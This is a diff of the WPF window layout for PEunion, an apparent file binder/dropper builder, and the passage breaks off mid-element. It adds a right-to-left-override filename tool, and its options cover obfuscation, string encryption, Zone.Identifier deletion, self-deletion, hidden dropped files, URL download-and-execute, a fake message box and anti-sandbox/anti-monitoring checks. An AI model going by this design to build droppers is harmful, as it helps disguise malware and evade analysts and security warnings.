@@ -115,8 +115,9 @@
 			</MenuItem>
 			<MenuItem Header="_Tools">
 				<MenuItem Header="_Open AppData Directory" api:MenuItemService.ImageSource="/PEunion;component/Resources/IconDirectory.png" Click="mnuToolsOpenAppDataDirectory_Click" />
-				<Separator />
 				<MenuItem Header="_Register .peu File Extension" Click="mnuToolsRegisterFileExtension_Click" />
+				<Separator />
+				<MenuItem Header="Right to _Left Override" api:MenuItemService.ImageSource="/PEunion;component/Resources/IconRtlo.png" Click="mnuToolsRtlo_Click" />
 			</MenuItem>
 			<MenuItem Header="_Help">
 				<MenuItem Header="PEunion on _GitHub" api:MenuItemService.ImageSource="/PEunion;component/Resources/IconGitHub.png" Click="mnuHelpGitHub_Click" />
@@ -151,414 +152,422 @@
 				<RowDefinition Height="6" />
 				<RowDefinition Height="150" MinHeight="100" />
 			</Grid.RowDefinitions>
-			<Grid>
-				<Grid.ColumnDefinitions>
-					<ColumnDefinition Width="250" MinWidth="150" />
-					<ColumnDefinition Width="6" />
-					<ColumnDefinition Width="*" />
-				</Grid.ColumnDefinitions>
-				<GroupBox Header="Project" Style="{StaticResource DockPanel}">
-					<TreeView Name="treMain" BorderThickness="0" ContextMenu="{StaticResource mnuTreeItems}" SelectedItemChanged="treMain_SelectedItemChanged" ContextMenuOpening="treMain_ContextMenuOpening" KeyDown="treMain_KeyDown">
-						<TreeView.Resources>
-							<HierarchicalDataTemplate DataType="{x:Type local:ProjectFile}">
-								<DockPanel>
-									<Grid Margin="0,0,5,0">
-										<Image Source="{Binding Icon}" />
-										<Image Source="/PEunion;component/Resources/IconUacOverlay.png" Visibility="{Binding Runas, Converter={StaticResource BooleanToVisibilityConverter}}" />
-									</Grid>
-									<TextBlock Text="{Binding Name}" />
-								</DockPanel>
-							</HierarchicalDataTemplate>
-							<HierarchicalDataTemplate DataType="{x:Type local:ProjectMessageBox}">
-								<local:TextDisplay Text="{Binding TreeViewItemText, Mode=OneWay}" ImageSource="/PEunion;component/Resources/IconMessageBox.png" />
-							</HierarchicalDataTemplate>
-							<HierarchicalDataTemplate DataType="{x:Type local:ProjectUrl}">
-								<local:TextDisplay Text="{Binding TreeViewItemText, Mode=OneWay}" ImageSource="/PEunion;component/Resources/IconUrl.png" />
-							</HierarchicalDataTemplate>
-						</TreeView.Resources>
-						<TreeViewItem Tag="OutputBinary">
-							<TreeViewItem.Header>
-								<local:TextDisplay Text="Build" ImageSource="/PEunion;component/Resources/IconBuild.png" />
-							</TreeViewItem.Header>
-							<TreeViewItem Tag="OutputBinary">
-								<TreeViewItem.Header>
-									<local:TextDisplay Text="Output Binary" ImageSource="/PEunion;component/Resources/IconOutputBinary.png" />
-								</TreeViewItem.Header>
-							</TreeViewItem>
-							<TreeViewItem Tag="CodeGeneration">
-								<TreeViewItem.Header>
-									<local:TextDisplay Text="Code Generation" ImageSource="/PEunion;component/Resources/IconCode.png" />
-								</TreeViewItem.Header>
-							</TreeViewItem>
-							<TreeViewItem Tag="Startup">
-								<TreeViewItem.Header>
-									<local:TextDisplay Text="Startup" ImageSource="/PEunion;component/Resources/IconStartup.png" />
-								</TreeViewItem.Header>
-							</TreeViewItem>
-						</TreeViewItem>
-						<TreeViewItem Name="treMainItems" Tag="Items" ItemsSource="{Binding Project.Items}">
-							<TreeViewItem.Header>
-								<local:TextDisplay Text="Items" ImageSource="/PEunion;component/Resources/IconFiles.png" />
-							</TreeViewItem.Header>
-							<TreeViewItem.Resources>
-								<Style TargetType="{x:Type TreeViewItem}" BasedOn="{StaticResource {x:Type TreeViewItem}}">
-									<Setter Property="IsSelected" Value="{Binding TreeViewItemIsSelected}" />
-								</Style>
-							</TreeViewItem.Resources>
-						</TreeViewItem>
-					</TreeView>
-				</GroupBox>
-				<GridSplitter Grid.Column="1" ResizeBehavior="PreviousAndNext" HorizontalAlignment="Stretch" />
-				<ScrollViewer Grid.Column="2" VerticalScrollBarVisibility="Auto">
-					<Grid Name="grdTabs" Background="#f7f7f7">
-						<Grid.Resources>
-							<Style TargetType="{x:Type TextBlock}">
-								<Setter Property="TextWrapping" Value="Wrap" />
-							</Style>
-							<Style x:Key="TabGrid" TargetType="{x:Type Grid}">
-								<Setter Property="Margin" Value="10,5,10,10" />
-							</Style>
-							<Style x:Key="Title" TargetType="{x:Type TextBlock}" BasedOn="{StaticResource {x:Type TextBlock}}">
-								<Setter Property="Margin" Value="0,0,0,10" />
-								<Setter Property="FontSize" Value="20" />
-							</Style>
-						</Grid.Resources>
-						<Grid Tag="OutputBinary" Style="{StaticResource TabGrid}">
-							<StackPanel>
-								<TextBlock Text="Output Binary" Style="{StaticResource Title}" />
-								<Grid>
-									<Grid.RowDefinitions>
-										<RowDefinition Height="Auto" />
-										<RowDefinition Height="Auto" />
-									</Grid.RowDefinitions>
-									<Grid.ColumnDefinitions>
-										<ColumnDefinition Width="*" />
-										<ColumnDefinition Width="10" />
-										<ColumnDefinition Width="*" />
-									</Grid.ColumnDefinitions>
-									<GroupBox Header="Assembly">
-										<StackPanel>
-											<local:TextDisplay Text="Platform:" InfoIcon="Platform does not need to match bitness of executed files" Margin="0,0,0,5" HorizontalAlignment="Left" />
-											<ComboBox ItemsSource="{x:Static local:Lookups.Platforms}" SelectedValuePath="Key" DisplayMemberPath="Value" SelectedValue="{Binding Project.Platform}" Style="{StaticResource UIComboBox}" Margin="0,0,0,10" />
-											<TextBlock Text="Manifest:" Margin="0,0,0,5" />
-											<ComboBox ItemsSource="{x:Static local:Lookups.Manifests}" SelectedValuePath="Key" DisplayMemberPath="Value" SelectedValue="{Binding Project.Manifest}" Style="{StaticResource UIComboBox}" />
-										</StackPanel>
-									</GroupBox>
-									<GroupBox Grid.Column="2" Header="Icon">
-										<StackPanel>
-											<Grid>
-												<Grid.ColumnDefinitions>
-													<ColumnDefinition Width="*" />
-													<ColumnDefinition Width="10" />
-													<ColumnDefinition Width="Auto" />
-												</Grid.ColumnDefinitions>
-												<local:FileBrowser x:Name="ctrlBrowseIcon" HorizontalAlignment="Left" AllowedExtensions="ico" FilesSelect="ctrlBrowseIcon_FilesSelect" />
-												<Button Grid.Column="2" Content="Reset Icon" Style="{StaticResource UIButton}" IsEnabled="{Binding Project.IconPath, Converter={StaticResource StringIsNullOrEmptyToBooleanConverter}}" VerticalAlignment="Bottom" Click="btnResetIcon_Click" />
+			<TabControl Name="tabMain" SelectionChanged="tabMain_SelectionChanged">
+				<TabControl.Resources>
+					<Style TargetType="{x:Type TabItem}" BasedOn="{StaticResource {x:Type TabItem}}">
+						<EventSetter Event="MouseUp" Handler="tabMain_TabItem_MouseUp" />
+					</Style>
+				</TabControl.Resources>
+				<TabItem>
+					<TabItem.Header>
+						<StackPanel Orientation="Horizontal">
+							<local:TextDisplay Text="{Binding Project.ProjectName, Converter={StaticResource StringAddConverter}, ConverterParameter={api:String .peu}}" ImageSource="/PEunion;component/Resources/IconPeuFile.png" />
+							<TextBlock Name="txtProjectTabIsDirty" Text=" *" />
+							<Button Style="{StaticResource CloseButton}" Command="{x:Static local:WindowMain.NewCommand}" />
+						</StackPanel>
+					</TabItem.Header>
+					<Grid>
+						<Grid.ColumnDefinitions>
+							<ColumnDefinition Width="250" MinWidth="150" />
+							<ColumnDefinition Width="6" />
+							<ColumnDefinition Width="*" />
+						</Grid.ColumnDefinitions>
+						<GroupBox Header="Project" Style="{StaticResource DockPanel}">
+							<TreeView Name="treMain" BorderThickness="0" ContextMenu="{StaticResource mnuTreeItems}" SelectedItemChanged="treMain_SelectedItemChanged" ContextMenuOpening="treMain_ContextMenuOpening" KeyDown="treMain_KeyDown">
+								<TreeView.Resources>
+									<HierarchicalDataTemplate DataType="{x:Type local:ProjectFile}">
+										<DockPanel>
+											<Grid Margin="0,0,5,0">
+												<Image Source="{Binding Icon}" />
+												<Image Source="/PEunion;component/Resources/IconUacOverlay.png" Visibility="{Binding Runas, Converter={StaticResource BooleanToVisibilityConverter}}" />
 											</Grid>
-										</StackPanel>
-									</GroupBox>
-									<GroupBox Grid.Row="1" Header="Assembly Information">
-										<StackPanel>
-											<Grid Margin="0,0,0,10">
-												<Grid.RowDefinitions>
-													<RowDefinition Height="Auto" />
-													<RowDefinition Height="Auto" />
-													<RowDefinition Height="Auto" />
-													<RowDefinition Height="Auto" />
-												</Grid.RowDefinitions>
-												<Grid.ColumnDefinitions>
-													<ColumnDefinition Width="Auto" />
-													<ColumnDefinition Width="10" />
-													<ColumnDefinition Width="*" />
-												</Grid.ColumnDefinitions>
-												<TextBlock Text="Title" Margin="0,5,0,0" />
-												<TextBlock Grid.Row="1" Text="Product" Margin="0,5,0,0" />
-												<TextBlock Grid.Row="2" Text="Copyright" Margin="0,5,0,0" />
-												<TextBlock Grid.Row="3" Text="Version" Margin="0,5,0,0" />
-												<TextBox Grid.Column="2" Text="{Binding Project.AssemblyTitle, UpdateSourceTrigger=PropertyChanged}" Style="{StaticResource UITextBox}" Margin="0,0,0,5" />
-												<TextBox Grid.Row="1" Grid.Column="2" Text="{Binding Project.AssemblyProduct, UpdateSourceTrigger=PropertyChanged}" Style="{StaticResource UITextBox}" Margin="0,0,0,5" />
-												<TextBox Grid.Row="2" Grid.Column="2" Text="{Binding Project.AssemblyCopyright, UpdateSourceTrigger=PropertyChanged}" Style="{StaticResource UITextBox}" Margin="0,0,0,5" />
-												<TextBox Grid.Row="3" Grid.Column="2" Text="{Binding Project.AssemblyVersion, UpdateSourceTrigger=PropertyChanged}" Style="{StaticResource UITextBox}" />
-											</Grid>
-											<Button Content="Select From File..." Style="{StaticResource UIButton}" HorizontalAlignment="Right" Click="btnSelectAssemblyInfo_Click" />
-										</StackPanel>
-									</GroupBox>
-								</Grid>
-							</StackPanel>
-						</Grid>
-						<Grid Tag="CodeGeneration" Style="{StaticResource TabGrid}">
-							<StackPanel>
-								<TextBlock Text="Code Generation" Style="{StaticResource Title}" />
-								<GroupBox>
-									<GroupBox.Header>
-										<local:TextDisplay Text="Obfuscation" InfoIcon="Obfuscation of symbol names (classes, methods and variables)" />
-									</GroupBox.Header>
+											<TextBlock Text="{Binding Name}" />
+										</DockPanel>
+									</HierarchicalDataTemplate>
+									<HierarchicalDataTemplate DataType="{x:Type local:ProjectMessageBox}">
+										<local:TextDisplay Text="{Binding TreeViewItemText, Mode=OneWay}" ImageSource="/PEunion;component/Resources/IconMessageBox.png" />
+									</HierarchicalDataTemplate>
+									<HierarchicalDataTemplate DataType="{x:Type local:ProjectUrl}">
+										<local:TextDisplay Text="{Binding TreeViewItemText, Mode=OneWay}" ImageSource="/PEunion;component/Resources/IconUrl.png" />
+									</HierarchicalDataTemplate>
+								</TreeView.Resources>
+								<TreeViewItem Tag="OutputBinary">
+									<TreeViewItem.Header>
+										<local:TextDisplay Text="Build" ImageSource="/PEunion;component/Resources/IconBuild.png" />
+									</TreeViewItem.Header>
+									<TreeViewItem Tag="OutputBinary">
+										<TreeViewItem.Header>
+											<local:TextDisplay Text="Output Binary" ImageSource="/PEunion;component/Resources/IconOutputBinary.png" />
+										</TreeViewItem.Header>
+									</TreeViewItem>
+									<TreeViewItem Tag="CodeGeneration">
+										<TreeViewItem.Header>
+											<local:TextDisplay Text="Code Generation" ImageSource="/PEunion;component/Resources/IconCode.png" />
+										</TreeViewItem.Header>
+									</TreeViewItem>
+									<TreeViewItem Tag="Startup">
+										<TreeViewItem.Header>
+											<local:TextDisplay Text="Startup" ImageSource="/PEunion;component/Resources/IconStartup.png" />
+										</TreeViewItem.Header>
+									</TreeViewItem>
+								</TreeViewItem>
+								<TreeViewItem Name="treMainItems" Tag="Items" ItemsSource="{Binding Project.Items}">
+									<TreeViewItem.Header>
+										<local:TextDisplay Text="Items" ImageSource="/PEunion;component/Resources/IconFiles.png" />
+									</TreeViewItem.Header>
+									<TreeViewItem.Resources>
+										<Style TargetType="{x:Type TreeViewItem}" BasedOn="{StaticResource {x:Type TreeViewItem}}">
+											<Setter Property="IsSelected" Value="{Binding TreeViewItemIsSelected}" />
+										</Style>
+									</TreeViewItem.Resources>
+								</TreeViewItem>
+							</TreeView>
+						</GroupBox>
+						<GridSplitter Grid.Column="1" ResizeBehavior="PreviousAndNext" HorizontalAlignment="Stretch" />
+						<ScrollViewer Grid.Column="2" VerticalScrollBarVisibility="Auto">
+							<Grid Name="grdTabs" Background="#f7f7f7">
+								<Grid.Resources>
+									<Style TargetType="{x:Type TextBlock}">
+										<Setter Property="TextWrapping" Value="Wrap" />
+									</Style>
+									<Style x:Key="TabGrid" TargetType="{x:Type Grid}">
+										<Setter Property="Margin" Value="10,5,10,10" />
+									</Style>
+									<Style x:Key="Title" TargetType="{x:Type TextBlock}" BasedOn="{StaticResource {x:Type TextBlock}}">
+										<Setter Property="Margin" Value="0,0,0,10" />
+										<Setter Property="FontSize" Value="20" />
+									</Style>
+								</Grid.Resources>
+								<Grid Tag="OutputBinary" Style="{StaticResource TabGrid}">
 									<StackPanel>
-										<ComboBox ItemsSource="{x:Static local:Lookups.Obfuscations}" SelectedValuePath="Key" DisplayMemberPath="Value" SelectedValue="{Binding Project.Obfuscation}" Style="{StaticResource UIComboBox}" Margin="0,0,0,5" />
-										<TextBlock DataContext="{Binding Project.ObfuscationExample}">
-											<Run Text="Example:" />
-											<Run Text="{Binding .}" />
+										<TextBlock Text="Output Binary" Style="{StaticResource Title}" />
+										<Grid>
+											<Grid.RowDefinitions>
+												<RowDefinition Height="Auto" />
+												<RowDefinition Height="Auto" />
+											</Grid.RowDefinitions>
+											<Grid.ColumnDefinitions>
+												<ColumnDefinition Width="*" />
+												<ColumnDefinition Width="10" />
+												<ColumnDefinition Width="*" />
+											</Grid.ColumnDefinitions>
+											<GroupBox Header="Assembly">
+												<StackPanel>
+													<local:TextDisplay Text="Platform:" InfoIcon="Platform does not need to match bitness of executed files" Margin="0,0,0,5" HorizontalAlignment="Left" />
+													<ComboBox ItemsSource="{x:Static local:Lookups.Platforms}" SelectedValuePath="Key" DisplayMemberPath="Value" SelectedValue="{Binding Project.Platform}" Style="{StaticResource UIComboBox}" Margin="0,0,0,10" />
+													<TextBlock Text="Manifest:" Margin="0,0,0,5" />
+													<ComboBox ItemsSource="{x:Static local:Lookups.Manifests}" SelectedValuePath="Key" DisplayMemberPath="Value" SelectedValue="{Binding Project.Manifest}" Style="{StaticResource UIComboBox}" />
+												</StackPanel>
+											</GroupBox>
+											<GroupBox Grid.Column="2" Header="Icon">
+												<StackPanel>
+													<local:FileBrowser x:Name="ctrlBrowseIcon" AllowedExtensions="ico" AllowReset="True" FilesSelect="ctrlBrowseIcon_FilesSelect" Reset="ctrlBrowseIcon_Reset" />
+												</StackPanel>
+											</GroupBox>
+											<GroupBox Grid.Row="1" Header="Assembly Information">
+												<StackPanel>
+													<Grid Margin="0,0,0,10">
+														<Grid.RowDefinitions>
+															<RowDefinition Height="Auto" />
+															<RowDefinition Height="Auto" />
+															<RowDefinition Height="Auto" />
+															<RowDefinition Height="Auto" />
+														</Grid.RowDefinitions>
+														<Grid.ColumnDefinitions>
+															<ColumnDefinition Width="Auto" />
+															<ColumnDefinition Width="10" />
+															<ColumnDefinition Width="*" />
+														</Grid.ColumnDefinitions>
+														<TextBlock Text="Title" Margin="0,5,0,0" />
+														<TextBlock Grid.Row="1" Text="Product" Margin="0,5,0,0" />
+														<TextBlock Grid.Row="2" Text="Copyright" Margin="0,5,0,0" />
+														<TextBlock Grid.Row="3" Text="Version" Margin="0,5,0,0" />
+														<TextBox Grid.Column="2" Text="{Binding Project.AssemblyTitle, UpdateSourceTrigger=PropertyChanged}" Style="{StaticResource UITextBox}" Margin="0,0,0,5" />
+														<TextBox Grid.Row="1" Grid.Column="2" Text="{Binding Project.AssemblyProduct, UpdateSourceTrigger=PropertyChanged}" Style="{StaticResource UITextBox}" Margin="0,0,0,5" />
+														<TextBox Grid.Row="2" Grid.Column="2" Text="{Binding Project.AssemblyCopyright, UpdateSourceTrigger=PropertyChanged}" Style="{StaticResource UITextBox}" Margin="0,0,0,5" />
+														<TextBox Grid.Row="3" Grid.Column="2" Text="{Binding Project.AssemblyVersion, UpdateSourceTrigger=PropertyChanged}" Style="{StaticResource UITextBox}" />
+													</Grid>
+													<Button Content="Select From File..." Style="{StaticResource UIButton}" HorizontalAlignment="Right" Click="btnSelectAssemblyInfo_Click" />
+												</StackPanel>
+											</GroupBox>
+										</Grid>
+									</StackPanel>
+								</Grid>
+								<Grid Tag="CodeGeneration" Style="{StaticResource TabGrid}">
+									<StackPanel>
+										<TextBlock Text="Code Generation" Style="{StaticResource Title}" />
+										<GroupBox>
+											<GroupBox.Header>
+												<local:TextDisplay Text="Obfuscation" InfoIcon="Obfuscation of symbol names (classes, methods and variables)" />
+											</GroupBox.Header>
+											<StackPanel>
+												<ComboBox ItemsSource="{x:Static local:Lookups.Obfuscations}" SelectedValuePath="Key" DisplayMemberPath="Value" SelectedValue="{Binding Project.Obfuscation}" Style="{StaticResource UIComboBox}" Margin="0,0,0,5" />
+												<TextBlock DataContext="{Binding Project.ObfuscationExample}">
+													<Run Text="Example:" />
+													<Run Text="{Binding .}" />
+												</TextBlock>
+											</StackPanel>
+										</GroupBox>
+										<GroupBox Grid.Column="2" Header="String Encryption">
+											<StackPanel>
+												<CheckBox IsChecked="{Binding Project.StringEncryption}">
+													<local:TextDisplay Text="String Encryption" InfoIcon="Encrypt strings for file names and other user-defined variables" />
+												</CheckBox>
+												<CheckBox IsChecked="{Binding Project.StringLiteralEncryption}">
+													<local:TextDisplay Text="String Literal Encryption" InfoIcon="Encrypt constant string literals in code template" />
+												</CheckBox>
+											</StackPanel>
+										</GroupBox>
+									</StackPanel>
+								</Grid>
+								<Grid Tag="Startup" Style="{StaticResource TabGrid}">
+									<StackPanel>
+										<TextBlock Text="Startup" Style="{StaticResource Title}" />
+										<GroupBox>
+											<GroupBox.Header>
+												<local:TextDisplay Text="Self" InfoIcon="Generated output executable itself, not the dropped files" />
+											</GroupBox.Header>
+											<StackPanel>
+												<CheckBox IsChecked="{Binding Project.DeleteZoneID}">
+													<local:TextDisplay Text="Delete ZoneID" InfoIcon="After first run, delete ':Zone.Identifier' alternate data stream to avoid subsequent 'Do you want to run this file?' dialog" />
+												</CheckBox>
+												<CheckBox IsChecked="{Binding Project.Melt}">
+													<local:TextDisplay Text="Melt" InfoIcon="Delete self after exit (Launches a cmd.exe process)" />
+												</CheckBox>
+											</StackPanel>
+										</GroupBox>
+									</StackPanel>
+								</Grid>
+								<Grid Tag="Items" Style="{StaticResource TabGrid}">
+									<StackPanel>
+										<TextBlock Text="Items" Style="{StaticResource Title}" />
+										<TextBlock Text=" • Files and other items are processed in the order they appear on the right side" />
+										<TextBlock Text=" • From the context menu, items can be re-ordered or deleted" />
+										<Grid Margin="0,10,0,0">
+											<Grid.ColumnDefinitions>
+												<ColumnDefinition Width="*" />
+												<ColumnDefinition Width="10" />
+												<ColumnDefinition Width="*" />
+												<ColumnDefinition Width="10" />
+												<ColumnDefinition Width="*" />
+											</Grid.ColumnDefinitions>
+											<GroupBox Header="Add Files">
+												<StackPanel>
+													<local:FileBrowser AllowMultiple="True" FilesSelect="ctrlAddFiles_FilesSelect" />
+												</StackPanel>
+											</GroupBox>
+											<GroupBox Grid.Column="2" Header="Add URL">
+												<StackPanel>
+													<TextBlock Text="Download a file from an URL:" Margin="0,0,0,10" />
+													<Button Content="Add URL" Style="{StaticResource UIButton}" HorizontalAlignment="Left" Click="btnAddUrl_Click" />
+												</StackPanel>
+											</GroupBox>
+											<GroupBox Grid.Column="4" Header="Add Message Box">
+												<StackPanel>
+													<TextBlock Text="Display a fake MessageBox:" Margin="0,0,0,10" />
+													<Button Content="Add Message Box" Style="{StaticResource UIButton}" HorizontalAlignment="Left" Click="btnAddMessageBox_Click" />
+												</StackPanel>
+											</GroupBox>
+										</Grid>
+									</StackPanel>
+								</Grid>
+								<Grid Tag="ProjectFile" Style="{StaticResource TabGrid}">
+									<StackPanel>
+										<TextBlock Text="{Binding SelectedProjectItem.Name}" Style="{StaticResource Title}" />
+										<TextBlock Margin="0,0,0,10">
+											<Hyperlink Click="mnuTreeFileOpenSourceDirectory_Click"><TextBlock><Run Text="{Binding SelectedProjectItem.SourceDirectory, Mode=OneWay}" /><Run Text="\" /></TextBlock></Hyperlink><Run Text="{Binding SelectedProjectItem.SourceFileName, Mode=OneWay}" />
+											<LineBreak />
+											<Run Text="Size:" />
+											<Run Text="{Binding SelectedProjectItem.SourceFileSize, Mode=OneWay}" />
 										</TextBlock>
+										<Grid>
+											<Grid.RowDefinitions>
+												<RowDefinition Height="Auto" />
+												<RowDefinition Height="Auto" />
+											</Grid.RowDefinitions>
+											<Grid.ColumnDefinitions>
+												<ColumnDefinition Width="*" />
+												<ColumnDefinition Width="10" />
+												<ColumnDefinition Width="*" />
+											</Grid.ColumnDefinitions>
+											<GroupBox Header="File Modification">
+												<StackPanel>
+													<CheckBox Content="Compress" IsChecked="{Binding SelectedProjectItem.Compress}" />
+													<CheckBox Content="Encrypt" IsChecked="{Binding SelectedProjectItem.Encrypt}" />
+													<CheckBox IsChecked="{Binding SelectedProjectItem.Hidden}">
+														<local:TextDisplay Text="Hidden" InfoIcon="Hide file by attributes Hidden|System" />
+													</CheckBox>
+												</StackPanel>
+											</GroupBox>
+											<GroupBox Grid.Column="2" Header="Dropping">
+												<StackPanel>
+													<TextBlock Text="File Name:" Margin="0,0,0,5" />
+													<TextBox Text="{Binding SelectedProjectItem.Name, UpdateSourceTrigger=PropertyChanged}" Style="{StaticResource UITextBox}" Margin="0,0,0,10" />
+													<TextBlock Text="Location:" Margin="0,0,0,5" />
+													<ComboBox ItemsSource="{x:Static local:Lookups.DropLocations}" SelectedValuePath="Key" DisplayMemberPath="Value" SelectedValue="{Binding SelectedProjectItem.DropLocation}" Style="{StaticResource UIComboBox}" />
+												</StackPanel>
+											</GroupBox>
+											<GroupBox Grid.Row="1" Header="Execution">
+												<StackPanel>
+													<CheckBox Content="Execute" IsChecked="{Binding SelectedProjectItem.Execute}" />
+													<CheckBox IsChecked="{Binding SelectedProjectItem.Runas}" IsEnabled="{Binding SelectedProjectItem.Execute}">
+														<local:TextDisplay Text="Run as Administrator" InfoIcon="Execute with 'runas' verb (will trigger the UAC dialog)" />
+													</CheckBox>
+													<CheckBox Content="Wait for exit" IsChecked="{Binding SelectedProjectItem.ExecuteWait}" IsEnabled="{Binding SelectedProjectItem.CanExecuteWait, Mode=OneWay}" />
+													<CheckBox Content="Delete" IsChecked="{Binding SelectedProjectItem.ExecuteDelete}" IsEnabled="{Binding SelectedProjectItem.CanExecuteDelete, Mode=OneWay}" />
+													<TextBlock Text="Command Line:" Margin="0,5" />
+													<TextBox Text="{Binding SelectedProjectItem.CommandLine, UpdateSourceTrigger=PropertyChanged}" Style="{StaticResource UITextBox}" />
+												</StackPanel>
+											</GroupBox>
+											<GroupBox Grid.Row="1" Grid.Column="2">
+												<GroupBox.Header>
+													<local:TextDisplay Text="Anti's" InfoIcon="File will not be processed if any of the following is detected" />
+												</GroupBox.Header>
+												<StackPanel>
+													<CheckBox IsChecked="{Binding SelectedProjectItem.AntiSandboxie}">
+														<local:TextDisplay Text="Sandboxie" InfoIcon="Process is running in Sandboxie (SbieDll.dll module loaded)" />
+													</CheckBox>
+													<CheckBox IsChecked="{Binding SelectedProjectItem.AntiWireshark}">
+														<local:TextDisplay Text="Wireshark" InfoIcon="Wireshark is running" />
+													</CheckBox>
+													<CheckBox IsChecked="{Binding SelectedProjectItem.AntiProcessMonitor}">
+														<local:TextDisplay Text="Process Monitor" InfoIcon="Process Monitor is running" />
+													</CheckBox>
+													<CheckBox IsChecked="{Binding SelectedProjectItem.AntiEmulator}">
+														<local:TextDisplay Text="Emulator" InfoIcon="Generic emulator test (takes 500 ms)" />
+													</CheckBox>
+												</StackPanel>
+											</GroupBox>
+										</Grid>
 									</StackPanel>
-								</GroupBox>
-								<GroupBox Grid.Column="2" Header="String Encryption">
+								</Grid>
+								<Grid Tag="ProjectUrl" Style="{StaticResource TabGrid}">
 									<StackPanel>
-										<CheckBox IsChecked="{Binding Project.StringEncryption}">
-											<local:TextDisplay Text="String Encryption" InfoIcon="Encrypt strings for file names and other user-defined variables" />
-										</CheckBox>
-										<CheckBox IsChecked="{Binding Project.StringLiteralEncryption}">
-											<local:TextDisplay Text="String Literal Encryption" InfoIcon="Encrypt constant string literals in code template" />
-										</CheckBox>
+										<TextBlock Text="URL Download" Style="{StaticResource Title}" />
+										<Grid>
+											<Grid.RowDefinitions>
+												<RowDefinition Height="Auto" />
+												<RowDefinition Height="Auto" />
+												<RowDefinition Height="Auto" />
+											</Grid.RowDefinitions>
+											<Grid.ColumnDefinitions>
+												<ColumnDefinition Width="*" />
+												<ColumnDefinition Width="10" />
+												<ColumnDefinition Width="*" />
+											</Grid.ColumnDefinitions>
+											<GroupBox Grid.ColumnSpan="3" Header="Download URL">
+												<StackPanel>
+													<TextBox Text="{Binding SelectedProjectItem.Url, UpdateSourceTrigger=PropertyChanged}" Style="{StaticResource UITextBox}" />
+												</StackPanel>
+											</GroupBox>
+											<GroupBox Grid.Row="1" Header="File Modification">
+												<StackPanel>
+													<CheckBox IsChecked="{Binding SelectedProjectItem.Hidden}">
+														<local:TextDisplay Text="Hidden" InfoIcon="Hide file by attributes Hidden|System" />
+													</CheckBox>
+												</StackPanel>
+											</GroupBox>
+											<GroupBox Grid.Row="1" Grid.Column="2" Header="Dropping">
+												<StackPanel>
+													<TextBlock Text="File Name:" Margin="0,0,0,5" />
+													<TextBox Text="{Binding SelectedProjectItem.Name, UpdateSourceTrigger=PropertyChanged}" Style="{StaticResource UITextBox}" Margin="0,0,0,10" />
+													<TextBlock Text="Location:" Margin="0,0,0,5" />
+													<ComboBox ItemsSource="{x:Static local:Lookups.DropLocations}" SelectedValuePath="Key" DisplayMemberPath="Value" SelectedValue="{Binding SelectedProjectItem.DropLocation}" Style="{StaticResource UIComboBox}" />
+												</StackPanel>
+											</GroupBox>
+											<GroupBox Grid.Row="2" Header="Execution">
+												<StackPanel>
+													<CheckBox Content="Execute" IsChecked="{Binding SelectedProjectItem.Execute}" />
+													<CheckBox IsChecked="{Binding SelectedProjectItem.Runas}" IsEnabled="{Binding SelectedProjectItem.Execute}">
+														<local:TextDisplay Text="Run as Administrator" InfoIcon="Execute with 'runas' verb (will trigger the UAC dialog)" />
+													</CheckBox>
+													<CheckBox Content="Wait for exit" IsChecked="{Binding SelectedProjectItem.ExecuteWait}" IsEnabled="{Binding SelectedProjectItem.CanExecuteWait, Mode=OneWay}" />
+													<CheckBox Content="Delete" IsChecked="{Binding SelectedProjectItem.ExecuteDelete}" IsEnabled="{Binding SelectedProjectItem.CanExecuteDelete, Mode=OneWay}" />
+													<TextBlock Text="Command Line:" Margin="0,5" />
+													<TextBox Text="{Binding SelectedProjectItem.CommandLine, UpdateSourceTrigger=PropertyChanged}" Style="{StaticResource UITextBox}" />
+												</StackPanel>
+											</GroupBox>
+											<GroupBox Grid.Row="2" Grid.Column="2">
+												<GroupBox.Header>
+													<local:TextDisplay Text="Anti's" InfoIcon="File will not be processed if any of the following is detected" />
+												</GroupBox.Header>
+												<StackPanel>
+													<CheckBox IsChecked="{Binding SelectedProjectItem.AntiSandboxie}">
+														<local:TextDisplay Text="Sandboxie" InfoIcon="Process is running in Sandboxie (SbieDll.dll module loaded)" />
+													</CheckBox>
+													<CheckBox IsChecked="{Binding SelectedProjectItem.AntiWireshark}">
+														<local:TextDisplay Text="Wireshark" InfoIcon="Wireshark is running" />
+													</CheckBox>
+													<CheckBox IsChecked="{Binding SelectedProjectItem.AntiProcessMonitor}">
+														<local:TextDisplay Text="Process Monitor" InfoIcon="Process Monitor is running" />
+													</CheckBox>
+													<CheckBox IsChecked="{Binding SelectedProjectItem.AntiEmulator}">
+														<local:TextDisplay Text="Emulator" InfoIcon="Generic emulator test (takes 500 ms)" />
+													</CheckBox>
+												</StackPanel>
+											</GroupBox>
+										</Grid>
 									</StackPanel>
-								</GroupBox>
-							</StackPanel>
-						</Grid>
-						<Grid Tag="Startup" Style="{StaticResource TabGrid}">
-							<StackPanel>
-								<TextBlock Text="Startup" Style="{StaticResource Title}" />
-								<GroupBox>
-									<GroupBox.Header>
-										<local:TextDisplay Text="Self" InfoIcon="Generated output executable itself, not the dropped files" />
-									</GroupBox.Header>
+								</Grid>
+								<Grid Tag="ProjectMessageBox" Style="{StaticResource TabGrid}">
 									<StackPanel>
-										<CheckBox IsChecked="{Binding Project.DeleteZoneID}">
-											<local:TextDisplay Text="Delete ZoneID" InfoIcon="After first run, delete ':Zone.Identifier' alternate data stream to avoid subsequent 'Do you want to run this file?' dialog" />
-										</CheckBox>
-										<CheckBox IsChecked="{Binding Project.Melt}">
-											<local:TextDisplay Text="Melt" InfoIcon="Delete self after exit (Launches a cmd.exe process)" />
-										</CheckBox>
+										<TextBlock Text="Message Box" Style="{StaticResource Title}" />
+										<Grid>
+											<Grid.RowDefinitions>
+												<RowDefinition Height="Auto" />
+												<RowDefinition Height="Auto" />
+												<RowDefinition Height="Auto" />
+												<RowDefinition Height="Auto" />
+												<RowDefinition Height="Auto" />
+											</Grid.RowDefinitions>
+											<Grid.ColumnDefinitions>
+												<ColumnDefinition Width="Auto" />
+												<ColumnDefinition Width="10" />
+												<ColumnDefinition Width="*" />
+											</Grid.ColumnDefinitions>
+											<TextBlock Text="Title" Margin="0,5,0,0" />
+											<TextBlock Grid.Row="1" Text="Text" Margin="0,5,0,0" />
+											<TextBlock Grid.Row="2" Text="Buttons" Margin="0,5,0,0" />
+											<TextBlock Grid.Row="3" Text="Icon" Margin="0,5,0,0" />
